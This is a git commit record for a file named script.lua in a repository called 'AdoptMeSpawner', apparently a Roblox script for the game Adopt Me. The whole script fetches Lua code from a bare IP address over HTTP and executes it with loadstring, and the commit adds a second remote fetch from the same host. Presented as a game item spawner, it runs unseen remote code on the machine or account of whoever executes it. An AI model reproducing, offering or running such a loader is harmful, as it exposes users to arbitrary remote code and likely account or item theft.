a70bd85159a480aef5610c4dbf7974c36a86913c
AdoptMeSpawner <138109658+FaerumeXD@users.noreply.github.com>
2025-11-04 17:51:10 +0900

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,2 +1,4 @@
 ID="0787e47e-64d4-4e32-8e62-1025a974d061";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
